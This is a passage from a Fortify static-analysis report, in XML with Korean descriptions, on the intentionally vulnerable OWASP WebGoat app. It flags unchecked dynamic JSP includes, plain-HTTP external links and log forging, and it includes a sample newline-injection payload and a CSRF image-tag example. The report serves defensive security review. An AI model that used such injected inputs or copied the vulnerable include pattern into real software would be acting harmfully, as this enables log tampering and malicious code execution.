                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>RoleBasedAccessControl.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/RoleBasedAccessControl.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="83903D247934F5757C805705E0134E65" ruleID="A4DB6C61-8D89-454D-903F-9F82173E09880">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>RoleBasedAccessControl.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/RoleBasedAccessControl.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A245F3E467C853D42855F28B4112762E" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CrossSiteScripting.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CrossSiteScripting.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/CrossSiteScripting.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AA22418AF30C611AE6E3B7AE97B31A7B" ruleID="A4DB6C61-8D89-454D-903F-9F82173E09880">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CrossSiteScripting.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CrossSiteScripting.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/CrossSiteScripting.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0F94EFC5A110F6564148176FDCAC70CC" ruleID="6E4F370A-5DB4-4A3E-8CAC-C691A9DE449A0">
                            <Category>Dangerous File Inclusion</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SQLInjection.jsp 파일은 20 줄의 동적 include 문에 확인되지 않은 파일 이름을 전달합니다. 확인되지 않은 사용자 입력이 JSP에 동적으로 포함되는 파일을 제어하면 악성 코드가 실행될 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SQLInjection.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SQLInjection.jsp</FilePath>
<LineStart>20</LineStart>
<Snippet>		//System.out.println("Including sub view page: " + subViewPage);
	%&gt;
	&lt;jsp:include page="&lt;%=subViewPage%&gt;" /&gt;
	&lt;%
	}</Snippet>
<TargetFunction>http://java.sun.com/JSP/Page/include/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Insecure Transport: External Link</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>CSRF.html 파일의 14 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>웹 사이트를 탐색할 때 사용자가 손상되지 않도록 웹 페이지의 하이퍼링크가 보안 위치로만 연결되도록 하십시오. 링크가 비보안 프로토콜(예: HTTP)에서 보안 프로토콜(예: HTTPS)로 리디렉션되는 경우에도 암호화되지 않은 채널을 통한 초기 연결을 통해 공격자는 MiTM(Man-in-The-Middle) 공격을 수행할 수 있습니다. 이를 통해 공격자는 결과 방문 페이지를 제어할 수 있습니다.

예제: 다음과 같은 하이퍼링크를 고려하십시오.

&lt;a href="http://www.example.com/index.html"/&gt;


공격자가 사용자와 서버 간의 네트워크 트래픽을 수신하는 경우 공격자는 www.example.com을 모방하거나 조작하여 자신의 웹 페이지를 로드할 수 있습니다.

타사 웹 사이트에 대한 링크는 처음에는 보안에 중요하지 않은 것으로 간주될 수 있지만 어떤 손상이든 사용자에게는 웹 페이지의 링크에서 오는 것처럼 보일 수 있으므로 플랫폼 사용에 대한 사용자의 신뢰를 떨어트릴 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>웹 사이트의 링크된 웹 페이지를 계속 제어하고 가능하면 링크가 항상 보안 프로토콜을 통해 로드되도록 하십시오. 대상 서버에 비보안 프로토콜이 필요한 경우 링크를 클릭하면 추가 위험이 있음을 사용자에게 알리는 경고를 제공하십시오. 가능하면 타사 사이트의 스크립트나 기타 아티팩트를 포함하지 마십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="FA7730A34EE13DC18A58B0E13A76E59A" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>NewLesson.html 파일의 9 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>NewLesson.html</FileName>
<FilePath>WebContent/lesson_plans/NewLesson.html</FilePath>
<LineStart>9</LineStart>
<Snippet>Adding lessons to WebGoat is very easy. If you have an idea that would be suitable&lt;br&gt; 
for a new lesson, follow these few simple instructions to implement it:&lt;br&gt;&lt;br&gt;
* Download the source code from &lt;a href="http://sourceforge.net/project/showfiles.php?group_id=64424&amp;package_id=61824"&gt;here.&lt;/a&gt;&lt;br&gt;&lt;br&gt;
* Setup framework: follow the simple instructions in "HOW TO create the WebGoat workspace.txt" that comes with the project.&lt;br&gt;&lt;br&gt;
* You need to add two files for each new lesson: &lt;br&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="A0EE5EDF8989758001B70924F24A750C" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>lessons.html 파일의 15 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>lessons.html</FileName>
<FilePath>WebContent/lesson_template/lessons.html</FilePath>
<LineStart>15</LineStart>
<Snippet>&lt;table width="100%" border="0" cellspacing="0" cellpadding="0" align="center"&gt;
  &lt;tr&gt; 
    &lt;td&gt; &lt;a href="http://www.aspectsecurity.com"&gt; &lt;img src="images/logo1.jpg" width="306" height="73" border="0" title="Aspect Security - Application security analysis, process, and training."&gt; 
      &lt;/a&gt;&lt;/td&gt;
  &lt;/tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="8A47FF47C96AAB11781F0336F798D374" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>webgoat_challenge.jsp 파일의 72 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>webgoat_challenge.jsp</FileName>
<FilePath>WebContent/webgoat_challenge.jsp</FilePath>
<LineStart>72</LineStart>
<Snippet>	  &lt;/div&gt;
		&lt;div id="bottom_ch"&gt;
			&lt;div align="center"&gt;&lt;img src="images/logos/owasp.jpg" alt="OWASP Foundation" width="166" height="29" longdesc="http://www.owasp.org" /&gt;&lt;a href="http://www.owasp.org"&gt;&lt;br /&gt;
&amp;copy; 2006 Project WebGoat&lt;/a&gt;&lt;/div&gt;
	  	&lt;/div&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="D15C0620BBB3E912A4C5092D06D62C07" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>webgoat.jsp 파일의 25 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>webgoat.jsp</FileName>
<FilePath>WebContent/webgoat.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>			&lt;table border="0" align="center" class="lessonText"&gt;
                &lt;tr&gt;
                  &lt;td width="50%"&gt;&lt;div align="center"&gt;&lt;a href="http://www.owasp.org"&gt;&lt;img border="0" src="images/logos/owasp.jpg" alt="OWASP Foundation" longdesc="http://www.owasp.org" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
                  &lt;td width="50%"&gt;&lt;div align="center"&gt;&lt;a href="http://www.aspectsecurity.com"&gt;&lt;img border="0" src="images/logos/aspect.jpg" alt="Aspect Security" longdesc="http://www.aspectsecurity.com" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
                &lt;/tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="68FE974F6AF4842AEEA27A096E64AD46" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>main.jsp 파일의 225 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>225</LineStart>
<Snippet>
		&lt;div id="bottom"&gt;
			&lt;div align="center"&gt;&lt;a href="http://www.owasp.org"&gt;OWASP Foundation&lt;/a&gt; | Project WebGoat&lt;/div&gt;
	  	&lt;/div&gt;
	&lt;/div&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="67B1D3DDE4D746D321F26DDD4A961EF8" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>CSRF.html 파일의 14 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>CSRF.html</FileName>
<FilePath>WebContent/lesson_plans/CSRF.html</FilePath>
<LineStart>14</LineStart>
<Snippet>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains img links like the one below: 

&lt;pre&gt;&amp;lt;img src="&lt;a href="http://www.mybank.com/transferFunds.do?acctId=123456" class='external free' title="http://www.mybank.com/transferFunds.do?acctId=123456" rel="nofollow"&gt;http://www.mybank.com/sendFunds.do?acctId=123456&lt;/a&gt;"/&amp;gt;&lt;/pre&gt;

When the victim's browser attempts to render this page, it will issue a request to www.mybank.com to the transferFunds.do page with the specified parameters. The browser will think the link is to get an image, even though it actually is a funds transfer function. </Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="FA7730A34EE13DC18A58B0E13A76E59B" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>NewLesson.html 파일의 15 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>NewLesson.html</FileName>
<FilePath>WebContent/lesson_plans/NewLesson.html</FilePath>
<LineStart>15</LineStart>
<Snippet>&amp;nbsp;&amp;nbsp;- YourLesson.html to WebContent/lesson_plans&lt;br&gt;&lt;br&gt;
* YourLesson class must implement LessonAdapter and override the following methods:&lt;br&gt;
&amp;nbsp;- createContent: Use the &lt;a href="http://jakarta.apache.org/site/downloads/downloads_ecs.cgi"&gt;ECS package&lt;/a&gt; to develop HTML presented to the user.&lt;br&gt;
&amp;nbsp;- getCategory: Returns the category for which this lesson belongs (XSS, Injection flaws..etc)&lt;br&gt;
&amp;nbsp;- getHints: List of hints you would like to pass on to the users to point them in the right direction.&lt;br&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="D15C0620BBB3E912A4C5092D06D62C08" ruleID="C72A3E77-8324-4FF9-B958-74FCDDF39D17">
                            <Category>Insecure Transport: External Link</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>webgoat.jsp 파일의 26 줄은 암호화되지 않은 채널을 통해 타사 사이트로 연결됩니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>webgoat.jsp</FileName>
<FilePath>WebContent/webgoat.jsp</FilePath>
<LineStart>26</LineStart>
<Snippet>                &lt;tr&gt;
                  &lt;td width="50%"&gt;&lt;div align="center"&gt;&lt;a href="http://www.owasp.org"&gt;&lt;img border="0" src="images/logos/owasp.jpg" alt="OWASP Foundation" longdesc="http://www.owasp.org" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
                  &lt;td width="50%"&gt;&lt;div align="center"&gt;&lt;a href="http://www.aspectsecurity.com"&gt;&lt;img border="0" src="images/logos/aspect.jpg" alt="Aspect Security" longdesc="http://www.aspectsecurity.com" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Log Forging</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 173 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Log forging 취약점은 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스에서 데이터가 응용 프로그램에 입력됩니다. 

2. 응용 프로그램 또는 시스템 로그 파일에 데이터가 작성됩니다. 

응용 프로그램은 일반적으로 차후 검토, 통계 수집 또는 디버깅을 위해 로그 파일을 사용하여 이벤트나 트랙잭션의 기록을 저장합니다. 로그 파일 검토 작업은 응용 프로그램의 성격에 따라 필요할 때 수동으로 수행할 수도 있고 자동으로 중요한 이벤트나 추세 정보의 로그를 발췌하는 도구를 사용하여 자동으로 수행할 수도 있습니다.

공격자가 응용 프로그램에 데이터를 공급하고 이후에 문자 그대로 응용 프로그램에 대한 로그가 작성되면 로그 파일 해석이 방해를 받거나 잘못될 수 있습니다. 가장 가벼운 공격은 공격자가 응용 프로그램에 해당 문자가 포함된 입력을 제공하는 방식으로 로그 파일에 가짜 항목을 삽입하는 것입니다. 로그 파일을 자동으로 처리하는 경우 공격자는 파일의 형식을 손상시키거나 잘못된 문자를 삽입하여 파일을 사용할 수 없게 만들 수 있습니다. 보다 효과적인 공격은 로그 파일 통계를 왜곡하는 것입니다. 왜곡 또는 다른 방식으로 손상된 로그 파일을 사용하여 공격자의 공격 루트를 은폐하거나 심지어 악의적인 행위에 제 3자를 끌어들일 수도 있습니다[1]. 최악의 경우는 공격자가 코드나 다른 명령을 로그 파일에 삽입하고 로그 처리 유틸리티의 취약점을 이용하는 것입니다[2].

예제 1: 다음 웹 응용 프로그램 코드는 요청 개체에서 정수 값을 읽으려고 합니다. 값을 정수로 구문 분석할 수 없으면 문제점을 나타내는 오류 메시지와 함께 입력을 기록합니다.


...
	String val = request.getParameter("val");
	try {
  		int value = Integer.parseInt(val);
	}
	catch (NumberFormatException nfe) {
  		log.info("Failed to parse val = " + val);
	}
...


사용자가 val에 문자열 "twenty-one"을 전송하면 다음 항목이 기록됩니다.


INFO: Failed to parse val=twenty-one


그러나, 공격자가 "twenty-one%0a%0aINFO:+User+logged+out%3dbadguy" 문자열을 전송하는 경우 다음 항목이 기록됩니다.


INFO: Failed to parse val=twenty-one

INFO: User logged out=badguy


공격자가 같은 메커니즘을 사용하여 임의의 로그 항목을 삽입할 수 있다는 것은 말할 필요도 없습니다.

모바일 환경에서는 Log forging과 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 2: 다음 코드는 Example 1을 Android 플랫폼에 맞게 조정합니다.


...
	String val = this.getIntent().getExtras().getString("val");
	try {
		int value = Integer.parseInt();
	}
	catch (NumberFormatException nfe) {
		Log.e(TAG, "Failed to parse val = " + val);
        }
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>간접 참조로 log forging 공격을 예방하십시오. 기록해야 하는 각 이벤트에 해당하는 올바른 로그 항목 집합을 만들어 이 집합의 항목만 기록합니다. 사용자의 시스템 로그아웃과 같은 동적 콘텐트를 캡처하려면 항상 사용자가 제공하는 데이터가 아닌 서버에서 제어하는 값을 사용하십시오. 이렇게 하면 사용자가 제공하는 입력은 로그 항목에 직접 사용되지 않습니다. 

다음과 같이 NumberFormatException에 해당하는 사전 정의된 로그 항목을 사용하도록 예제 1을 다시 작성할 수 있습니다.


...
	public static final String NFE = "Failed to parse val. The input is required to be an integer value."
...
	String val = request.getParameter("val");
        try {
                int value = Integer.parseInt(val);
        }
        catch (NumberFormatException nfe) {
                log.info(NFE);
        }
..


Android에 해당하는 코드는 다음과 같습니다.


...
	public static final String NFE = "Failed to parse val. The input is required to be an integer value."
...
        String val = this.getIntent().getExtras().getString("val");
        try {
                int value = Integer.parseInt();
        }
        catch (NumberFormatException nfe) {
                Log.e(TAG, NFE);
        }
...


경우에 따라 올바른 로그 항목 집합이 너무 크거나 복잡하기 때문에 이 접근 방식은 실용적이지 못합니다. 이런 상황에서 개발자는 흔히 거부 목록을 구현합니다. 거부 목록은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리하는 데 사용됩니다. 하지만 안전하지 않은 문자 목록은 금방 불완전해지거나 최신 상태를 유지하기 어렵습니다. 효율적인 접근 방식은 로그 항목에 사용할 수 있는 문자의 목록을 만들어 목록에 있는 문자만으로 이루어진 입력만 받는 것입니다. 대부분의 log forging 공격에서 핵심이 되는 문자는 '\n'(줄 바꿈) 문자로 이 문자는 로그 항목 허용 목록에 포함해서는 안 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 많은 로깅 작업이 개발 및 테스트 도중 프로그램 디버깅의 목적을 위해서만 만들어집니다. 경험에 따르면 우연이든, 의도적이든 운영 과정에서 디버깅을 사용하게 됩니다. 단지 프로그래머가 "운영에 디버깅을 사용할 계획이 없다"고 말한다고 해서 log forging 취약점을 간과해서는 안 됩니다.

2. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="F90BC8B23A129DD6A654B8EE14A202D3" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 205 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>205</LineStart>
<Snippet>	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="96A538553C505647E58E259A23FE04AB" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LessonSource.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 105 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>105</LineStart>
<Snippet>	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB47C3483DA161AFDAD611B3ECDE062F" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 173 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>173</LineStart>
<Snippet>	    UserTracker userTracker = UserTracker.instance();
	    userTracker.update(mySession, screen);
	    log(request, screen.getClass().getName() + " | "
		    + mySession.getParser().toString());
</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E3C937B3D0198B6F1DE184BAF51F1E6" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
